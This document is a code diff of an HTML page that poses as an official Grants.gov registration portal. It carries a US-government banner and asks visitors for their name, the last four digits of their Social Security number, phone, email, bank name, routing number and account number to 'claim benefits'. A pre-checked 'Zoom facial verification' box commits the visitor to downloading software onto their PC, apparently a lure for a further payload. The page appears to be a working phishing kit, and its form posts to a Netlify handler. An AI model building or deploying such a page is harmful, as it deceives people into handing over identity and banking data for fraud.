@@ -1,736 +1,1931 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>Registration</title>
+    <meta charset="UTF-8">
 
-  <style>
-    :root {
-      --primary: #1a4480;
-      --primary-dark: #162e51;
-      --border: #dfe1e2;
-      --text: #1b1b1b;
-      --muted: #565c65;
-      --background: #f5f5f5;
-      --white: #fff;
-      --danger: #b50909;
-      --success: #176b2c;
-    }
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
 
-    * {
-      box-sizing: border-box;
-    }
+    <title>Registration</title>
 
-    body {
-      margin: 0;
-      font-family:
-        system-ui,
-        -apple-system,
-        BlinkMacSystemFont,
-        "Segoe UI",
-        sans-serif;
-      color: var(--text);
-      background: var(--background);
-      line-height: 1.5;
-    }
 
-    /* US RESIDENTS BANNER */
-    .resident-banner {
-      width: 100%;
-      min-height: 32px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      padding: 5px 12px;
-      color: var(--white);
-      background: #162e51;
-      font-size: 0.78rem;
-      font-weight: 600;
-      letter-spacing: 0.1px;
-      text-align: center;
-    }
+    <style>
 
-    .resident-flag {
-      width: 22px;
-      height: 15px;
-      display: inline-flex;
-      flex-shrink: 0;
-      overflow: hidden;
-      border-radius: 1px;
-      box-shadow: 0 0 0 1px rgb(255 255 255 / 25%);
-      background:
-        linear-gradient(
-          to bottom,
-          #bf0a30 0%,
-          #bf0a30 7.69%,
-          #fff 7.69%,
-          #fff 15.38%,
-          #bf0a30 15.38%,
-          #bf0a30 23.07%,
-          #fff 23.07%,
-          #fff 30.76%,
-          #bf0a30 30.76%,
-          #bf0a30 38.45%,
-          #fff 38.45%,
-          #fff 46.14%,
-          #bf0a30 46.14%,
-          #bf0a30 53.83%,
-          #fff 53.83%,
-          #fff 61.52%,
-          #bf0a30 61.52%,
-          #bf0a30 69.21%,
-          #fff 69.21%,
-          #fff 76.90%,
-          #bf0a30 76.90%,
-          #bf0a30 84.59%,
-          #fff 84.59%,
-          #fff 92.28%,
-          #bf0a30 92.28%,
-          #bf0a30 100%
-        );
-      position: relative;
-    }
+        /* =========================================================
+           GLOBAL
+        ========================================================= */
 
-    .resident-flag::before {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 42%;
-      height: 54%;
-      background: #162e51;
-    }
+        * {
+            box-sizing: border-box;
+        }
 
-    /* DESKTOP ONLY MESSAGE */
-    #device-error {
-      display: none;
-      min-height: 100vh;
-      padding: 40px 20px;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      background: var(--background);
-    }
 
-    .device-error-card {
-      width: min(500px, 100%);
-      background: #fff;
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 35px 28px;
-      box-shadow: 0 2px 8px rgb(0 0 0 / 8%);
-    }
+        html,
+        body {
 
-    .device-error-card h1 {
-      color: var(--primary-dark);
-      margin-top: 0;
-    }
+            margin: 0;
+            padding: 0;
 
-    .device-error-card p {
-      color: var(--muted);
-      margin-bottom: 0;
-    }
+            background: #ffffff;
 
-    .site-content {
-      display: block;
-    }
+            color: #111111;
 
-    .site-header {
-      background: var(--white);
-      border-bottom: 1px solid var(--border);
-    }
+            font-family:
+                Arial,
+                Helvetica,
+                sans-serif;
 
-    .header-inner {
-      width: min(1100px, calc(100% - 32px));
-      margin: auto;
-      min-height: 90px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
+            font-size: 12px;
 
-    .logo {
-      display: inline-flex;
-      align-items: center;
-      color: var(--primary-dark);
-      text-decoration: none;
-      font-size: 1.5rem;
-      font-weight: 700;
-    }
+        }
 
-    .logo img {
-      display: block;
-      width: auto;
-      height: 58px;
-      object-fit: contain;
-    }
 
-    .main {
-      width: min(800px, calc(100% - 32px));
-      margin: 40px auto;
-    }
+        body {
+            min-height: 100vh;
+        }
 
-    .card {
-      background: var(--white);
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      padding: 32px;
-      box-shadow: 0 2px 8px rgb(0 0 0 / 8%);
-    }
 
-    h1 {
-      margin: 0 0 8px;
-      color: var(--primary-dark);
-    }
+        /* =========================================================
+           PAGE ANIMATION
+        ========================================================= */
 
-    .intro {
-      margin: 0 0 32px;
-      color: var(--muted);
-    }
+        @keyframes pageFadeIn {
 
-    fieldset {
-      border: 0;
-      padding: 0;
-      margin: 0 0 32px;
-    }
+            from {
 
-    legend {
-      width: 100%;
-      margin-bottom: 20px;
-      padding-bottom: 8px;
-      border-bottom: 2px solid var(--border);
-      color: var(--primary-dark);
-      font-size: 1.25rem;
-      font-weight: 700;
-    }
+                opacity: 0;
 
-    .form-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 20px;
-    }
+                transform:
+                    translateY(8px);
 
-    .field {
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-    }
+            }
 
-    .field.full {
-      grid-column: 1 / -1;
-    }
+            to {
 
-    label {
-      font-weight: 600;
-    }
+                opacity: 1;
 
-    .required {
-      color: var(--danger);
-    }
+                transform:
+                    translateY(0);
 
-    input {
-      width: 100%;
-      min-height: 44px;
-      padding: 10px 12px;
-      border: 1px solid #8d9297;
-      border-radius: 4px;
-      font: inherit;
-      background: #fff;
-    }
+            }
 
-    input:focus {
-      outline: 3px solid rgb(0 94 162 / 30%);
-      border-color: var(--primary);
-    }
+        }
 
-    .help {
-      margin: 0;
-      color: var(--muted);
-      font-size: .9rem;
-    }
 
-    /* TERMS AND CONDITIONS */
-    .terms-section {
-      margin-top: 8px;
-      margin-bottom: 28px;
-      padding: 18px;
-      border: 1px solid var(--border);
-      border-radius: 5px;
-      background: #f8f9fa;
-    }
+        #computer-page {
 
-    .terms-title {
-      margin: 0 0 10px;
-      color: var(--primary-dark);
-      font-weight: 700;
-    }
+            animation:
+                pageFadeIn
+                0.55s
+                ease-out;
 
-    .terms-text {
-      margin: 0 0 16px;
-      color: var(--muted);
-      font-size: .92rem;
-    }
+        }
+        /* =========================================================
+           TOP DEMO NOTICE
+           
+           No blue background.
+           Off-white background.
+        ========================================================= */
 
-    .agreement {
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-      cursor: pointer;
-      font-weight: 600;
-    }
+        .official-notice {
 
-    .agreement input[type="checkbox"] {
-      width: 20px;
-      min-width: 20px;
-      height: 20px;
-      min-height: 20px;
-      margin: 2px 0 0;
-      padding: 0;
-      accent-color: var(--primary);
-      cursor: pointer;
-    }
+            min-height: 32px;
 
-    .actions {
-      display: flex;
-      justify-content: flex-end;
-      gap: 12px;
-      padding-top: 8px;
-    }
+            background:
+                #f7f4ec;
 
-    button {
-      min-height: 44px;
-      padding: 10px 22px;
-      border: 0;
-      border-radius: 4px;
-      font: inherit;
-      font-weight: 700;
-      cursor: pointer;
-    }
+            border-bottom:
+                1px solid #ddd8ca;
 
-    button:disabled {
-      opacity: .55;
-      cursor: not-allowed;
-    }
+            display: flex;
 
-    .button-primary {
-      color: var(--white);
-      background: var(--primary);
-    }
+            align-items: center;
 
-    .button-primary:hover:not(:disabled) {
-      background: var(--primary-dark);
-    }
+            justify-content: center;
 
-    .button-secondary {
-      color: var(--text);
-      background: #eee;
-    }
+            gap: 7px;
 
-    /* FOOTER */
-    .footer {
-      padding: 30px 20px;
-      text-align: center;
-      color: var(--muted);
-      font-size: .9rem;
-      background: #fff;
-      border-top: 1px solid var(--border);
-    }
+            padding:
+                6px 15px;
 
-    .footer-logo {
-      display: inline-block;
-      margin-bottom: 12px;
-    }
+            color: #333333;
 
-    .footer-logo img {
-      height: 42px;
-      width: auto;
-      display: block;
-      margin: auto;
-    }
+            font-size: 11px;
 
-    .social-links {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 16px;
-      margin: 12px 0;
-    }
+            text-align: center;
 
-    .social-links a {
-      color: var(--primary);
-      text-decoration: none;
-      font-weight: 600;
-    }
+        }
 
-    .social-links a:hover {
-      color: var(--primary-dark);
-      text-decoration: underline;
-    }
 
-    .footer-copy {
-      margin: 12px 0 0;
-    }
+        /*
+         * Explicit flag styling so the emoji remains
+         * visible even where emoji rendering differs.
+         */
 
-    /* TABLET / MOBILE = BLOCK ACCESS */
-    @media (max-width: 900px) {
-      .site-content {
-        display: none;
-      }
+        .us-flag {
 
-      #device-error {
-        display: flex;
-      }
-    }
+            display: inline-flex;
 
-    @media (max-height: 500px) and (orientation: landscape) {
-      .site-content {
-        display: none;
-      }
+            align-items: center;
 
-      #device-error {
-        display: flex;
-      }
-    }
+            justify-content: center;
 
-    @media (max-width: 600px) {
-      .device-error-card {
-        padding: 28px 20px;
-      }
-    }
-  </style>
+            width: 18px;
+
+            height: 14px;
+
+            flex: 0 0 18px;
+
+            font-size: 14px;
+
+            line-height: 14px;
+
+            font-family:
+                "Apple Color Emoji",
+                "Segoe UI Emoji",
+                "Noto Color Emoji",
+                sans-serif;
+
+        }
+
+
+        .official-notice a {
+
+            color: #005a9c;
+
+            text-decoration: underline;
+
+        }
+
+
+        .official-notice a:hover {
+
+            color: #003d6b;
+
+        }
+
+
+        /* =========================================================
+           HEADER
+           
+           Blue box removed.
+        ========================================================= */
+
+        .header {
+
+            height: 64px;
+
+            background: #ffffff;
+
+            color: #222222;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: space-between;
+
+            padding:
+                0 22px;
+
+            border-bottom:
+                1px solid #dddddd;
+
+            box-shadow:
+                0 1px 4px
+                rgba(0, 0, 0, 0.05);
+
+        }
+
+
+        .logo-link {
+
+            display: flex;
+
+            align-items: center;
+
+            height: 48px;
+
+            text-decoration: none;
+
+            transition:
+                opacity 0.2s ease,
+                transform 0.2s ease;
+
+        }
+
+
+        .logo-link:hover {
+
+            opacity: 0.85;
+
+            transform:
+                translateY(-1px);
+
+        }
+
+
+        .logo {
+
+            display: block;
+
+            width: auto;
+
+            height: auto;
+
+            max-width: 220px;
+
+            max-height: 45px;
+
+            object-fit: contain;
+
+        }
+
+
+        .menu {
+
+            color: #444444;
+
+            font-size: 12px;
+
+            cursor: pointer;
+
+        }
+
+
+        /* =========================================================
+           MAIN PAGE
+        ========================================================= */
+
+        .page {
+
+            width: 100%;
+
+            max-width: none;
+
+            margin:
+                15px 0 0;
+
+            padding:
+                0 15px;
+
+        }
+
+
+        .breadcrumb {
+
+            color: #666666;
+
+            font-size: 11px;
+
+            margin-bottom: 12px;
+
+        }
+
+
+        .title {
+
+            margin: 0;
+
+            padding-bottom: 8px;
+
+            color: #003b75;
+
+            font-size: 20px;
+
+            font-weight: normal;
+
+            border-bottom:
+                1px solid #003b75;
+
+        }
+
+
+        .intro {
+
+            width: 830px;
+
+            max-width: 100%;
+
+            margin:
+                11px auto 24px;
+
+            line-height: 1.45;
+
+            color: #111111;
+
+            text-align: left;
+
+        }
+
+
+        /* =========================================================
+           FULL-WIDTH FIELDSET BOXES
+        ========================================================= */
+
+        fieldset {
+
+            position: relative;
+
+            width: 100%;
+
+            min-width: 0;
+
+            margin:
+                0 0 22px;
+
+            padding:
+                22px 14px 18px;
+
+            border:
+                1px solid #c9c9c9;
+
+            border-radius: 2px;
+
+            background:
+                linear-gradient(
+                    to bottom,
+                    #ffffff 0%,
+                    #fcfcfc 100%
+                );
+
+            box-shadow:
+                0 1px 2px
+                rgba(0, 0, 0, 0.06),
+
+                0 3px 8px
+                rgba(0, 0, 0, 0.035);
+
+            transition:
+                box-shadow 0.25s ease,
+                border-color 0.25s ease;
+
+        }
+
+
+        fieldset:hover {
+
+            border-color:
+                #b8b8b8;
+
+            box-shadow:
+                0 2px 3px
+                rgba(0, 0, 0, 0.08),
+
+                0 5px 14px
+                rgba(0, 0, 0, 0.06);
+
+        }
+
+
+        legend {
+
+            padding:
+                0 6px;
+
+            color: #003b75;
+
+            font-weight: bold;
+
+            font-size: 13px;
+
+        }
+
+
+        /* =========================================================
+           CENTERED FORM CONTENT
+        ========================================================= */
+
+        .form-content {
+
+            width: 830px;
+
+            max-width: 100%;
+
+            margin:
+                0 auto;
+
+        }
+
+
+        /* =========================================================
+           FORM ROWS
+        ========================================================= */
+
+        .form-row {
+
+            display: flex;
+
+            align-items: flex-start;
+
+            margin-bottom: 7px;
+
+            min-height: 27px;
+
+        }
+
+
+        /*
+         * Instructions / labels remain left aligned.
+         */
+
+        .form-label {
+
+            width: 205px;
+
+            text-align: left;
+
+            padding:
+                5px 8px 0 0;
+
+            font-weight: bold;
+
+            white-space: nowrap;
+
+        }
+
+
+        .required {
+
+            color: #b40000;
+
+        }
+
+
+        /* =========================================================
+           BEVELED INPUTS
+        ========================================================= */
+
+        .form-control {
+
+            width: 237px;
+
+            height: 29px;
+
+            border:
+                1px solid #9fa5aa;
+
+            border-radius: 2px;
+
+            background:
+                linear-gradient(
+                    to bottom,
+                    #fafafa 0%,
+                    #ffffff 45%,
+                    #f4f4f4 100%
+                );
+
+            padding:
+                4px 7px;
+
+            color: #222222;
+
+            font-family:
+                Arial,
+                Helvetica,
+                sans-serif;
+
+            font-size: 12px;
+
+            box-shadow:
+
+                inset 0 1px 0
+                rgba(255, 255, 255, 0.95),
+
+                inset 0 -1px 2px
+                rgba(0, 0, 0, 0.12),
+
+                inset 1px 0 2px
+                rgba(0, 0, 0, 0.04),
+
+                0 1px 2px
+                rgba(0, 0, 0, 0.14);
+
+            transition:
+
+                border-color 0.2s ease,
+
+                box-shadow 0.2s ease,
+
+                transform 0.15s ease;
+
+        }
+
+
+        .form-control:hover {
+
+            border-color:
+                #7f8992;
+
+            box-shadow:
+
+                inset 0 1px 0
+                rgba(255, 255, 255, 1),
+
+                inset 0 -1px 2px
+                rgba(0, 0, 0, 0.13),
+
+                0 2px 5px
+                rgba(0, 0, 0, 0.12);
+
+        }
+
+
+        .form-control:focus {
+
+            outline: none;
+
+            background:
+                #ffffff;
+
+            border-color:
+                #214675;
+
+            box-shadow:
+
+                inset 0 1px 2px
+                rgba(0, 0, 0, 0.16),
+
+                inset 1px 0 2px
+                rgba(0, 0, 0, 0.04),
+
+                0 0 0 2px
+                rgba(33, 70, 117, 0.10),
+
+                0 3px 8px
+                rgba(33, 70, 117, 0.16);
+
+            transform:
+                translateY(-1px);
+
+        }
+
+
+        .short-control {
+
+            width: 28px;
+
+        }
+
+
+        /* =========================================================
+           HELP / INSTRUCTION TEXT
+           
+           Left aligned.
+        ========================================================= */
+
+        .help-text {
+
+            width: 100%;
+
+            margin:
+                -2px 0 8px;
+
+            color: #444444;
+
+            line-height: 1.45;
+
+            text-align: left;
+
+        }
+
+
+        .section-description {
+
+            width: 100%;
+
+            margin:
+                0 0 14px;
+
+            color: #444444;
+
+            line-height: 1.45;
+
+            text-align: left;
+
+        }
+
+
+        .favorite-help {
+
+            width: 100%;
+
+            margin:
+                -2px 0 10px;
+
+            color: #444444;
+
+            line-height: 1.45;
+
+            text-align: left;
+
+        }
+
+
+        /* =========================================================
+           COMMUNICATIONS
+        ========================================================= */
+
+        .communications {
+
+            padding-bottom: 15px;
+
+        }
+
+
+        .subscribe-row {
+
+            display: flex;
+
+            align-items: flex-start;
+
+        }
+
+
+        .subscribe-label {
+
+            width: 205px;
+
+            text-align: left;
+
+            padding:
+                2px 8px 0 0;
+
+            font-weight: bold;
+
+        }
+
+
+        .subscriptions {
+
+            flex: 1;
+
+        }
+
+
+        .checkbox-row {
+
+            margin-bottom: 9px;
+
+            text-align: left;
+
+        }
+
+
+        .checkbox-title {
+
+            font-weight: bold;
+
+            text-align: left;
+
+        }
+
+
+        .checkbox-title input {
+
+            vertical-align: -1px;
+
+            margin:
+                0 4px 0 0;
+
+            accent-color:
+                #214675;
+
+        }
+
+
+        .checkbox-description {
+
+            margin-top: 5px;
+
+            color: #555555;
+
+            line-height: 1.4;
+
+            max-width: 650px;
+
+            text-align: left;
+
+        }
+
+
+        /* =========================================================
+           BUTTON AREA
+           
+           Explicit 830px centered wrapper.
+           Buttons themselves are centered exactly.
+        ========================================================= */
+
+        .buttons {
+
+            width: 830px;
+
+            max-width: 100%;
+
+            margin:
+                0 auto 35px;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            gap: 7px;
+
+        }
+
+
+        button {
+
+            height: 33px;
+
+            padding:
+                0 13px;
+
+            border-radius: 2px;
+
+            font-family:
+                Arial,
+                Helvetica,
+                sans-serif;
+
+            font-size: 12px;
+
+            font-weight: bold;
+
+            cursor: pointer;
+
+            transition:
+
+                background 0.2s ease,
+
+                box-shadow 0.2s ease,
+
+                transform 0.15s ease;
+
+        }
+
+
+        .continue {
+
+            color: #ffffff;
+
+            background:
+                linear-gradient(
+                    to bottom,
+                    #205487,
+                    #174677
+                );
+
+            border:
+                1px solid #174677;
+
+            box-shadow:
+                0 2px 4px
+                rgba(23, 70, 119, 0.20);
+
+        }
+
+
+        .continue:hover {
+
+            background:
+                linear-gradient(
+                    to bottom,
+                    #28649b,
+                    #12385e
+                );
+
+            box-shadow:
+                0 4px 9px
+                rgba(23, 70, 119, 0.25);
+
+            transform:
+                translateY(-1px);
+
+        }
+
+
+        .cancel {
+
+            color: #111111;
+
+            background:
+                linear-gradient(
+                    to bottom,
+                    #f4f4f4,
+                    #dedede
+                );
+
+            border:
+                1px solid #aaaaaa;
+
+            box-shadow:
+                0 1px 3px
+                rgba(0, 0, 0, 0.08);
+
+        }
+
+
+        .cancel:hover {
+
+            background:
+                linear-gradient(
+                    to bottom,
+                    #eeeeee,
+                    #d5d5d5
+                );
+
+            box-shadow:
+                0 3px 7px
+                rgba(0, 0, 0, 0.12);
+
+        }
+
+
+        /* =========================================================
+           RED WARNING
+        ========================================================= */
+
+        .warning {
+
+            width: 100%;
+
+            border-top:
+                1px solid #b30000;
+
+            border-bottom:
+                1px solid #d8a0a0;
+
+            background:
+                linear-gradient(
+                    to bottom,
+                    #fff8f8,
+                    #fff0f0
+                );
+
+            color:
+                #8a0000;
+
+            padding:
+                16px 20px 18px;
+
+            font-size: 10px;
+
+            line-height: 1.45;
+
+            text-align: left;
+
+        }
+
+
+        .warning-title {
+
+            margin-bottom: 4px;
+
+            color:
+                #b00000;
+
+            font-weight: bold;
+
+            font-size: 11px;
+
+        }
+
+
+        /* =========================================================
+           FOOTER
+        ========================================================= */
+
+        .footer {
+
+            width: 100%;
+
+            background:
+                #214675;
+
+            color: #ffffff;
+
+            border-top:
+                4px solid #17375d;
+
+            box-shadow:
+                0 -2px 7px
+                rgba(0, 0, 0, 0.10);
+
+        }
+
+
+        .footer-inner {
+
+            width: 100%;
+
+            min-height: 145px;
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            justify-content: center;
+
+            gap: 14px;
+
+            padding:
+                22px 20px;
+
+        }
+
+
+        .footer-logo {
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+        }
+
+
+        .footer-logo a {
+
+            display: inline-flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            text-decoration: none;
+
+            transition:
+                opacity 0.2s ease,
+                transform 0.2s ease;
+
+        }
+
+
+        .footer-logo a:hover {
+
+            opacity: 0.85;
+
+            transform:
+                translateY(-1px);
+
+        }
+
+
+        .footer-logo img {
+
+            display: block;
+
+            max-width: 180px;
+
+            max-height: 50px;
+
+            width: auto;
+
+            height: auto;
+
+            object-fit: contain;
+
+        }
+
+
+        /* =========================================================
+           SOCIAL LINKS
+        ========================================================= */
+
+        .footer-social {
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+        }
+
+
+        .social-links {
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            gap: 9px;
+
+            flex-wrap: nowrap;
+
+        }
+
+
+        .social-link {
+
+            display: inline-flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            min-width: 82px;
+
+            height: 30px;
+
+            padding:
+                0 10px;
+
+            border:
+                1px solid
+                rgba(255, 255, 255, 0.35);
+
+            border-radius: 3px;
+
+            color: #ffffff;
+
+            background:
+                rgba(255, 255, 255, 0.06);
+
+            text-decoration: none;
+
+            font-size: 11px;
+
+            font-weight: bold;
+
+            transition:
+
+                background 0.2s ease,
+
+                border-color 0.2s ease,
+
+                transform 0.2s ease;
+
+        }
+
+
+        .social-link:hover {
+
+            background:
+                rgba(255, 255, 255, 0.17);
+
+            border-color:
+                rgba(255, 255, 255, 0.65);
+
+            transform:
+                translateY(-2px);
+
+        }
+
+
+        /* =========================================================
+           FOOTER BOTTOM
+        ========================================================= */
+
+        .footer-bottom {
+
+            border-top:
+                1px solid
+                rgba(255, 255, 255, 0.15);
+
+            padding:
+                10px 20px;
+
+            color:
+                rgba(255, 255, 255, 0.75);
+
+            font-size: 10px;
+
+            text-align: center;
+
+        }
+
+
+        /* =========================================================
+           NETLIFY HONEYPOT
+        ========================================================= */
+
+        .hidden-field {
+
+            position: absolute !important;
+
+            left: -9999px !important;
+
+            width: 1px !important;
+
+            height: 1px !important;
+
+            overflow: hidden !important;
+
+        }
+        /* Responsive layout: the registration form is available on all screen sizes. */
+/* =========================================================
+           SMALL DEVICES
+        ========================================================= */
+
+        @media (max-width: 600px) {
+
+            .device-error {
+
+                padding:
+                    20px;
+
+            }
+
+
+            .device-error-box {
+
+                width: 100%;
+
+                padding:
+                    35px 20px;
+
+            }
+
+
+            .device-error h1 {
+
+                font-size:
+                    22px;
+
+            }
+
+
+            .device-error p {
+
+                font-size:
+                    13px;
+
+            }
+
+        }
+
+
+        @media (max-width: 500px) {
+
+            .social-links {
+
+                gap:
+                    5px;
+
+            }
+
+
+            .social-link {
+
+                min-width:
+                    70px;
+
+                padding:
+                    0 6px;
+
+                font-size:
+                    10px;
+
+            }
+
+        }
+
+    </style>
+
 </head>
 
+
 <body>
+<!-- =========================================================
+         COMPUTER PAGE
+    ========================================================== -->
 
-  <!-- US RESIDENTS BANNER -->
-  <div class="resident-banner">
-    <span class="resident-flag" aria-hidden="true"></span>
-    <span>An official website of the United States government</span>
-  </div>
+    <div id="computer-page">
 
-  <!-- DEVICE RESTRICTION MESSAGE -->
-  <section id="device-error" aria-labelledby="device-error-title">
-    <div class="device-error-card">
-      <h1 id="device-error-title">Computer Required</h1>
-      <p>
-        This registration form is only available on a computer.
-        Please open this page on a desktop or laptop computer to continue.
-      </p>
+
+        <!-- =====================================================
+             TOP DEMO NOTICE
+        ====================================================== -->
+
+        <div class="official-notice">
+
+            <span
+                class="us-flag"
+                aria-label="United States flag"
+            >
+                🇺🇸
+            </span>
+
+
+            <span>
+                An official website of the United States government
+            </span>
+
+        </div>
+
+
+
+        <!-- =====================================================
+             HEADER
+        ====================================================== -->
+
+        <header class="header">
+
+
+            <a
+                href="./images/grants-gov-logo"
+                class="logo-link"
+            >
+
+                <img
+                    src="./images/grants-gov-logo-text.png"
+                    alt="Registration portal logo"
+                    class="logo"
+                >
+
+            </a>
+
+        </header>
+
+
+
+        <!-- =====================================================
+             MAIN
+        ====================================================== -->
+
+        <main class="page">
+
+
+            <div class="breadcrumb">
+
+                GRANTS.GOV › Register
+
+            </div>
+
+
+
+            <h1 class="title">
+
+                REGISTER
+
+            </h1>
+
+
+
+            <div class="intro">
+
+                Please enter your information below to register for your Grant.
+                Required fields are marked
+                with an asterisk
+                (<span class="required">*</span>).
+
+            </div>
+
+
+
+            <!-- =================================================
+                 NETLIFY FORM
+            ================================================== -->
+
+            <form
+
+                name="registration"
+
+                method="POST"
+
+                action="./success.html"
+
+                data-netlify="true"
+
+                netlify-honeypot="bot-field"
+
+                id="registration-form"
+
+            >
+
+
+                <input
+                    type="hidden"
+                    name="form-name"
+                    value="registration"
+                >
+
+
+
+                <!-- Netlify honeypot -->
+
+                <div class="hidden-field">
+
+                    <label>
+
+                        Don't fill this out if you're human:
+
+                        <input
+                            name="bot-field"
+                            type="text"
+                        >
+
+                    </label>
+
+                </div>
+
+
+
+                <!-- =================================================
+                     CONTACT INFORMATION
+                ================================================== -->
+
+                <fieldset>
+
+
+                    <legend>
+                        Contact Information:
+                    </legend>
+
+
+                    <div class="form-content">
+
+
+                        <!-- First Name -->
+
+                        <div class="form-row">
+
+                            <label
+                                class="form-label"
+                                for="first-name"
+                            >
+
+                                <span class="required">
+                                    *
+                                </span>
+
+                                First Name:
+
+                            </label>
+
+
+                            <input
+                                class="form-control"
+                                id="first-name"
+                                name="first-name"
+                                type="text"
+                                autocomplete="given-name"
+                                required
+                            >
+
+                        </div>
+
+
+
+                        <!-- Middle Initial -->
+
+                        <div class="form-row">
+
+                            <label
+                                class="form-label"
+                                for="middle-initial"
+                            >
+
+                                Middle Initial:
+
+                            </label>
+
+
+                            <input
+                                class="form-control short-control"
+                                id="middle-initial"
+                                name="middle-initial"
+                                type="text"
+                                maxlength="1"
+                            >
+
+                        </div>
+
+
+
+                        <!-- Last Name -->
+
+                        <div class="form-row">
+
+                            <label
+                                class="form-label"
+                                for="last-name"
+                            >
+
+                                <span class="required">
+                                    *
+                                </span>
+
+                                Last Name:
+
+                            </label>
+
+
+                            <input
+                                class="form-control"
+                                id="last-name"
+                                name="last-name"
+                                type="text"
+                                autocomplete="family-name"
+                                required
+                            >
+
+                        </div>
+
+
+                        <!-- Last four digits of application number -->
+                        <div class="form-row">
+                            <label class="form-label" for="app-no-last-four">
+                                <span class="required">*</span>
+                                Last 4 digit of SSN.:
+                            </label>
+                            <div>
+                                <div style="display:flex; align-items:center; gap:4px;">
+                                    <span aria-hidden="true">xxx-xxx-</span>
+                                    <input
+                                        class="form-control"
+                                        id="ssn-last-four"
+                                        name="ssn-last-four"
+                                        type="text"
+                                        inputmode="numeric"
+                                        pattern="[0-9]{4}"
+                                        maxlength="4"
+                                        minlength="4"
+                                        placeholder="____"
+                                        aria-label="Last four digits of application number"
+                                        title="Enter exactly four digits."
+                                        required
+                                    >
+                                </div>
+                                <div class="help-text">Enter the last four digits of your Social Security Number.</div>
+                            </div>
+                        </div>
+
+
+
+                        <!-- Email -->
+
+                        <div class="form-row">
+
+                            <label
+                                class="form-label"
+                                for="email"
+                            >
+
+                                <span class="required">
+                                    *
+                                </span>
+
+                                Email Address:
+
+                            </label>
+
+
+                            <input
+                                class="form-control"
+                                id="email"
+                                name="email"
+                                type="email"
+                                autocomplete="email"
+                                required
+                            >
+
+                        </div>
+
+
+
+                        <!-- Mobile -->
+
+                        <div class="form-row">
+
+                            <label
+                                class="form-label"
+                                for="mobile-phone"
+                            >
+
+                                Mobile Phone Number:
+
+                            </label>
+
+
+                            <input
+                                class="form-control"
+                                id="mobile-phone"
+                                name="mobile-phone"
+                                type="tel"
+                                autocomplete="tel"
+								required
+                            >
+
+                        </div>
+
+
+
+                        <div class="help-text">
+
+                            Enter your U.S. mobile phone number.
+
+                        </div>
+
+
+
+                        <!-- Confirm Mobile -->
+
+                        <div class="form-row">
+
+                            <label
+                                class="form-label"
+                                for="confirm-mobile-phone"
+                            >
+
+                                Confirm Mobile Phone Number:
+
+                            </label>
+
+
+                            <input
+                                class="form-control"
+                                id="confirm-mobile-phone"
+                                name="confirm-mobile-phone"
+                                type="tel"
+                                autocomplete="tel"
+								required
+                            >
+
+                        </div>
+
+
+                    </div>
+
+                </fieldset>
+
+
+
+                <!-- =================================================
+                     ACCOUNT
+                ================================================== -->
+
+                <fieldset>
+
+
+                    <legend>
+                        Account Details:
+                    </legend>
+
+
+                    <div class="form-content">
+
+
+                        <p class="section-description">
+
+                            Enter Your bank information to claim your Grants.gov benefits.
+
+                        </p>
+
+
+
+                        <!-- bank -->
+
+                        <div class="form-row">
+
+                            <label
+                                class="form-label"
+                                for="bank"
+                            >
+
+                                <span class="required">
+                                    *
+                                </span>
+
+                                Bank Name:
+
+                            </label>
+
+
+                            <input
+                                class="form-control"
+                                id="Bank"
+                                name="Bank"
+                                type="text"
+                                autocomplete="organization-title"
+                                required
+                            >
+
+                        </div>
+
+
+
+                        <!-- Routing No. -->
+
+                        <div class="form-row">
+
+                            <label
+                                class="form-label"
+                                for="Routing-no"
+                            >
+
+                                <span class="required">
+                                    *
+                                </span>
+
+                                Routing No:
+
+                            </label>
+
+
+                            <input
+                                class="form-control"
+                                id="Routing-no"
+                                name="Routing-no"
+                                type="text"
+                                autocomplete="off"
+                                required
+                            >
+
+                        </div>
+
+
+                        <!-- Account number -->
+
+                        <div class="form-row">
+
+                            <label
+                                class="form-label"
+                                for="Account-no"
+                            >
+
+                                <span class="required">
+                                    *
+                                </span>
+								
+                                Account No:
+
+                            </label>
+
+
+                            <input
+                                class="form-control"
+                                id="Account-no"
+                                name="Account-no"
+                                type="text"
+                                autocomplete="off"
+                            >
+
+                        </div>
+
+
+                    </div>
+
+                </fieldset>
+
+
+
+                <!-- =================================================
+                     TERMS AND CONFIRMATION
+                ================================================== -->
+
+                <fieldset
+                    class="Terms and Confirmation"
+                >
+
+
+                    <legend>
+                        Terms and Confirmation:
+                    </legend>
+
+
+                    <div class="form-content">
+
+
+                        <div class="subscribe-row">
+
+
+                            <div class="Accept-label">
+
+                                Accept:
+
+                            </div>
+
+
+                            <div class="subscriptions">
+
+
+                                <!-- Alerts -->
+
+                                <div class="checkbox-row">
+
+
+                                    <div class="checkbox-title">
+
+                                        <label>
+
+                                            <input
+                                                type="checkbox"
+                                                name="subscriptions"
+                                                value="registration-details-confirmation"
+                                                checked
+                                            >
+
+                                            ZOOM FACIAL VERIFICATION
+
+                                        </label>
+
+                                    </div>
+
+
+                                    <div class="checkbox-description">
+
+										Yes, I am ready to verify my identity using the Zoom verification meeting.(I am willing to download the required version on my PC).
+
+                                    </div>
+
+
+                                </div>
+
+
+
+                                <!-- Newsletter -->
+
+                                <div class="checkbox-row">
+
+
+                                    <div class="checkbox-title">
+
+                                        <label>
+
+                                            <input
+                                                type="checkbox"
+                                                name="subscriptions"
